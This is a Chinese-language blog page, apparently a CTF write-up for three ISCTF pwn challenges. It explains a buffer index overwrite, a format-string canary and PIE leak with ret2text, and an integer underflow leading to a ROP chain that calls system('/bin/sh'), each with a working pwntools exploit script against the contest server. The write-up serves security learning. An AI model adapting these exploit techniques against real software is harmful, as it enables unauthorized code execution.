@@ -1,0 +1,202 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ISCTF-Stack | Xizi的个人博客</title><meta name="author" content="xizi"><meta name="copyright" content="xizi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1.Sign 看ida里，可以看出buf是一维数组。类型为dword，4字节。所以索引值为27的 时候，实际上是第28个元素。所以我们只需要控制覆。盖buf的第28个元素为-1378178390就可以getshell了。那么padding就是27*4&#x3D;108。由于这里是有符号数转16进制，所以上网站转换一下就行。  目标数的16进制是0xaddaaaaa。同时由于这里是dword，4字节">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ISCTF-Stack">
+<meta property="og:url" content="http://example.com/2025/12/11/ISCTF-Stack/index.html">
+<meta property="og:site_name" content="Xizi的个人博客">
+<meta property="og:description" content="1.Sign 看ida里，可以看出buf是一维数组。类型为dword，4字节。所以索引值为27的 时候，实际上是第28个元素。所以我们只需要控制覆。盖buf的第28个元素为-1378178390就可以getshell了。那么padding就是27*4&#x3D;108。由于这里是有符号数转16进制，所以上网站转换一下就行。  目标数的16进制是0xaddaaaaa。同时由于这里是dword，4字节">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/butterfly-icon.png">
+<meta property="article:published_time" content="2025-12-11T15:38:10.000Z">
+<meta property="article:modified_time" content="2025-12-11T16:47:56.124Z">
+<meta property="article:author" content="xizi">
+<meta property="article:tag" content="pwn入门">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "ISCTF-Stack",
+  "url": "http://example.com/2025/12/11/ISCTF-Stack/",
+  "image": "http://example.com/img/butterfly-icon.png",
+  "datePublished": "2025-12-11T15:38:10.000Z",
+  "dateModified": "2025-12-11T16:47:56.124Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "xizi",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/12/11/ISCTF-Stack/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ISCTF-Stack',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/_custom/custom.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Xizi的个人博客</span></a><a class="nav-page-title" href="/"><span class="site-name">ISCTF-Stack</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">ISCTF-Stack</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-12-11T15:38:10.000Z" title="发表于 2025-12-11 23:38:10">2025-12-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-12-11T16:47:56.124Z" title="更新于 2025-12-12 00:47:56">2025-12-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="1-Sign"><a href="#1-Sign" class="headerlink" title="1.Sign"></a>1.Sign</h1><p><img src="/images/is1-1.png" alt="ida"></p>
+<p>看ida里，可以看出buf是一维数组。类型为dword，4字节。所以索引值为27的</p>
+<p>时候，实际上是第28个元素。所以我们只需要控制覆。盖buf的第28个元素为-1378178390就可以getshell了。那么padding就是27*4&#x3D;108。由于这里是有符号数转16进制，所以上网站转换一下就行。</p>
+<p><img src="/images/is1-2.png"></p>
+<p>目标数的16进制是0xaddaaaaa。同时由于这里是dword，4字节，所以用p32包裹0xaddaaaaa就可以getshell了。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;challenge.bluesharkinfo.com&#x27;</span>,<span class="number">25138</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span> * <span class="number">108</span> + p32(<span class="number">0xaddaaaaa</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;do you like blueshark?&#x27;</span>,pl)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="2-Fmt"><a href="#2-Fmt" class="headerlink" title="2.Fmt"></a>2.Fmt</h1><p><img src="/images/is2-1.png" alt="ida"></p>
+<p>经典的格式化字符串泄露。但是这里需要换一下附件的依赖。</p>
+<p>由于这里给了libc.so.6，所以我们可以通过strings libc.so.6 | grep “ubuntu”来获得版本。</p>
+<p>例如输出：GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.10) stable release version 2.35.</p>
+<p>所以可以在glibc-all-in-one 去寻找2.35-0ununtu3的版本来下载动态链接器（一般保持大版本相同就行）。</p>
+<p>patchelf –replace-needed (原版本)libc.so.6 (替换的版本).&#x2F;libc.so.6 (文件名).&#x2F;pwn</p>
+<p>patchelf –set-interpreter ld-linux-x86-64.so.2(替换的版本) .&#x2F;pwn</p>
+<p>如果能成功运行程序，那么基本就可以了。像检查的话，可以由ldd pwn来查看附件的以来情况。</p>
+<p>回到这道题，第一步还是测试数据。可以得到offset&#x3D;6，那么canary的位置就是6 +（0x90-0x8）&#x2F;8 &#x3D; 23。</p>
+<p><img src="/images/is2-2.png" alt="gdb"></p>
+<p>可以看出canary距离为2的地方存放了main的地址，那么减去main函数在ida里的地址（pie保护），再减去偏移量，就可以得到程序的基址了。（也可以看main函数中mov eax，0的位置的地址是多少。）</p>
+<p>同时程序win函数中存放了shell，所以后面用ret2text的做法就可以getshell了。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./ez_fmt&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;challenge.bluesharkinfo.com&#x27;</span>,<span class="number">20932</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ez_fmt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl1 = <span class="string">b&#x27;%23$paa%25$p&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;1st input: &#x27;</span>,pl1)</span><br><span class="line"><span class="comment">#canary = u64(io.recvuntil(b&#x27;\x7f&#x27;)[:-6].rjust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(canary))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">pro_base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">97</span> - <span class="number">0x12fa</span></span><br><span class="line">success(<span class="built_in">hex</span>(pro_base))</span><br><span class="line">backdoor = elf.symbols[<span class="string">&#x27;win&#x27;</span>] + pro_base</span><br><span class="line">success(<span class="built_in">hex</span>(backdoor))</span><br><span class="line">ret = <span class="number">0x12f9</span> + pro_base</span><br><span class="line"></span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x90</span>-<span class="number">0x8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(ret) + p64(backdoor)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;2nd input: &#x27;</span>,pl2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="3-EZ2048"><a href="#3-EZ2048" class="headerlink" title="3.EZ2048"></a>3.EZ2048</h1><p>一道非常有意思的题目🤔。</p>
+<p><img src="/images/is3-1.png" alt="main"></p>
+<p>具体的代码不完全展示了。基本逻辑就是通过2048来获取分数，满足100000分后可以进入shell函数。这里的漏洞点在整型溢出。由于有有符号数转无符号数的代码，所以当有符号数为-1等数的时候，转为无符号数是极大值。由于这里一开始给我们50分，结束一局扣10分。所以可以通过连续推出6局来使分数达到-10转成一个大于100000的分数，从而成功进入shell函数。</p>
+<p><img src="/images/is3-2.png" alt="shell"></p>
+<p>可以看到这里的shell函数只会执行一个ls的命令，还有一个exit的命令。同时还存在canary。所以第一个想法是先泄露canary。canary在buf[17]的位置上，也就是前面有17个元素。qword是8字节，所以padding&#x3D;17*8&#x3D;136。由于printf截断\x00输出的缘故，所以再填充一个junk，将canary顺势输出。</p>
+<p>再结合前面main函数，让你输入名字的地方，发现buf的位置正好是bss段。所以可以写入&#x2F;bin&#x2F;sh，最后再回到地址0x404a40来实现getshell。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./ez2048&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;challenge.bluesharkinfo.com&#x27;</span>,<span class="number">23145</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ez2048&#x27;</span>)</span><br><span class="line">bss = <span class="number">0x404a46</span></span><br><span class="line">sys = <span class="number">0x401170</span></span><br><span class="line">ret = <span class="number">0x4027ea</span></span><br><span class="line">rdi = <span class="number">0x40133e</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;game&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;your score:&#x27;</span>)</span><br><span class="line">    score = <span class="built_in">int</span>(io.recvline()[:-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> score&lt;<span class="number">0</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">        io.send(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">        io.send(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    io.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;$ &#x27;</span>) </span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">136</span> + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">io.send(pl1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;ab&#x27;</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line">success(<span class="string">f&#x27;canary:&#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x90</span>-<span class="number">0x8</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(ret) + p64(rdi) + p64(bss) + p64(sys) </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;$ &#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">pause()</span><br><span class="line">io.send(<span class="string">b&#x27;exit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里解释一下exp。</p>
+<p>bss地址为什么要偏移6。</p>
+<p>可以看一下源代码。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(dest, <span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(dest, buf);</span><br><span class="line"><span class="built_in">strcpy</span>(buf, dest);</span><br></pre></td></tr></table></figure>
+
+<p>所以可以看出来，hello和我们输入的内容拼接在一起，并且写到了bss段上。</p>
+<p>最后为什么要发送exit。</p>
+<p>因为我们构造的执行流是需要到shell函数的结束的时候才会执行。而这里存在两个死循环，所以我们需要主动打破最外层的循环来使程序执行我们构造的恶意代码。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">xizi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/12/11/ISCTF-Stack/">http://example.com/2025/12/11/ISCTF-Stack/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Xizi的个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn%E5%85%A5%E9%97%A8/">pwn入门</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/11/21/ret2csu/" title="ret2csu"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">ret2csu</div></div><div class="info-2"><div class="info-item-1">ret2csu将附件丢进ida  可以看到，程序中不存在任何后门函数。但是附件又给了libc.so.6，所以我们可以通过write函数，将write或者read的地址进行泄露，从而达到ret2libc的做法。 于是我们需要控制write的执行流。可以看出write有三个参数：fd，buf，len。在x86-64架构下，前六个参数依次存在rdi，rsi，rdx，rcx，r8，r9。所以我们只要做到rsi &#x3D; 1；rdi &#x3D; write_got；len&gt;&#x3D;8就可以了。 __libc_csu_init进行初始化时有这么一串汇编指令：  如果我们把上半部分成为gadget2，下半部分gadget1。那么在gadget1中可以看出我们可以轻松控制pop到各个寄存器的值，再结合gadget2，可以看出控制r12间接控制rdi–fd（这里r12d是指取rdi的低四字节的值，因为是控制fd所以不影响）；控制r13间接控制rsi–write_got；控制r14间接控制rdx–len。所以我们需要在vuln中进行栈溢出，控制程序执行到gadget1的位置，然后精心...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/11/11/2025-0xGame-Week1-Pwn/" title="2025 0xGame Week1 Pwn"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-11</div><div class="info-item-2">2025 0xGame Week1 Pwn</div></div><div class="info-2"><div class="info-item-1">0xGame Week1 Pwn1.Test your nc简单的签到题，熟知nc的用法即可。  2.命令执行同样远端连接后，可以直接获取shell，不过过滤了cat和sh指令。通过拼接就可以成功获得flag。  3.Stack overflow栈溢出。先丢进ida查看，发现backdoor，却是假的，但是whhhat给出了shell。再看main函数，看到了read危险函数，并且存在溢出的机会。   简单说一下exp，首先是对pwn工具库的一个调用，之后是对远端的连接，如果是在虚拟机上连接远端环境用remote，如果在物理机上则用connect，调试也可以用process指令。观察ida可以看出距离rbp为0x30又有0x8（64位下）的大小存放rbp，所以距离ret_addr实际上是0x38的大小，所以填充0x38的padding来使函数返回至后门函数，也就是shell的地址（在ida中找出，这里不做演示）。最后getshell。  4.ROP1rop链是pwn的一种常见攻击手段，可以上网看看原理。把附件丢进ida中  可以看到有gadget函数，可以在ida中查看gadge...</div></div></div></a><a class="pagination-related" href="/2025/11/21/ret2csu/" title="ret2csu"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-21</div><div class="info-item-2">ret2csu</div></div><div class="info-2"><div class="info-item-1">ret2csu将附件丢进ida  可以看到，程序中不存在任何后门函数。但是附件又给了libc.so.6，所以我们可以通过write函数，将write或者read的地址进行泄露，从而达到ret2libc的做法。 于是我们需要控制write的执行流。可以看出write有三个参数：fd，buf，len。在x86-64架构下，前六个参数依次存在rdi，rsi，rdx，rcx，r8，r9。所以我们只要做到rsi &#x3D; 1；rdi &#x3D; write_got；len&gt;&#x3D;8就可以了。 __libc_csu_init进行初始化时有这么一串汇编指令：  如果我们把上半部分成为gadget2，下半部分gadget1。那么在gadget1中可以看出我们可以轻松控制pop到各个寄存器的值，再结合gadget2，可以看出控制r12间接控制rdi–fd（这里r12d是指取rdi的低四字节的值，因为是控制fd所以不影响）；控制r13间接控制rsi–write_got；控制r14间接控制rdx–len。所以我们需要在vuln中进行栈溢出，控制程序执行到gadget1的位置，然后精心...</div></div></div></a><a class="pagination-related" href="/2025/11/12/2025-0xGame-Week2-Pwn/" title="2025 0xGame Week2 Pwn"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-12</div><div class="info-item-2">2025 0xGame Week2 Pwn</div></div><div class="info-2"><div class="info-item-1">0xGame Week2 Pwn1.Ret2libc像这样类似的题，关键是确定libc.so.6的版本，然后泄露出libc_base的地址。因为这样可以确定system的地址和&#x2F;bin&#x2F;sh的地址，从而实现getshell。  由vuln可以看出read存在溢出点。  解读一下exp，这边pl1通过栈溢出，覆盖至ret，因为ret指令实际上相当于pop rip，即将rsp处的值弹给rip去执行。所以这里将ret地址返回为puts_plt，也就是会执行一个puts函数，同时rdi中存储着puts的真实地址，由puts_got表跳转得到。再减去由libc.so.6版本控制的offset，就可以获得libc_base的地址。然后就是正常的rop链攻击。 2.格式化字符串将附件丢进ida静态分析  可以看出这里有两次read和printf函数，并且每次都会将我们输入的数据输出。由于第一个read函数规定读取数据大小只有0x60，所以这里不存在溢出点。但是可以通过第一个read来泄露一些我们需要的数据，如canary和libc_base的地址。·第二个read存在栈溢出...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xizi</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Sign"><span class="toc-number">1.</span> <span class="toc-text">1.Sign</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-Fmt"><span class="toc-number">2.</span> <span class="toc-text">2.Fmt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-EZ2048"><span class="toc-number">3.</span> <span class="toc-text">3.EZ2048</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/11/ISCTF-Stack/" title="ISCTF-Stack">ISCTF-Stack</a><time datetime="2025-12-11T15:38:10.000Z" title="发表于 2025-12-11 23:38:10">2025-12-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/21/ret2csu/" title="ret2csu">ret2csu</a><time datetime="2025-11-20T23:58:34.000Z" title="发表于 2025-11-21 07:58:34">2025-11-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/12/2025-0xGame-Week2-Pwn/" title="2025 0xGame Week2 Pwn">2025 0xGame Week2 Pwn</a><time datetime="2025-11-12T13:35:55.000Z" title="发表于 2025-11-12 21:35:55">2025-11-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/11/2025-0xGame-Week1-Pwn/" title="2025 0xGame Week1 Pwn">2025 0xGame Week1 Pwn</a><time datetime="2025-11-11T04:38:04.000Z" title="发表于 2025-11-11 12:38:04">2025-11-11</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By xizi</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script src="/js/click-poem.js"></script><script async data-pjax src="/"></script></div></body></html>
